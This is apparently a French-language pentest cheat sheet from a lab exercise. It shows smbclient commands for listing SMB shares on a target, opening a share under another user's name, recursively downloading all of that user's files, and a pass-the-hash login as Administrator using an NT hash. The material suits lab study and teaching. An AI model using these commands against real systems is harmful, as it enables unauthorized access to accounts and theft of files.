# découvrir un dossier partagé :
```
$ smbclient -L //192.168.56.16
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        qiu             Disk      
        IPC$            IPC       IPC Service (MERCY server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            MERCY

```
# Ouverture d'un dossier smb avec le nom d'un autre utilisateur
```
$ smbclient //192.168.56.16/qiu -U qiu
Password for [WORKGROUP\qiu]:
Try "help" to get a list of possible commands.
smb: \>
```

# Aide des commandes 
```
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \>
```

# On liste les fichiers :
```
smb: \> dir
```

# On télécharge tous les fichiers de qiu :
```
smb: \> mask ""
smb: \> recurse on
smb: \> mget *

```
ou 
```
smbclient '\\server\share'
mask ""
recurse ON
prompt OFF
cd 'path\to\remote\dir'
lcd '~/path/to/download/to/'
mget *
```

# PASS THE HASH
Si on connait le hash du mt de passe d'une personne mais pas son mot de passe, on peut passer uniquement le hash :
```
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```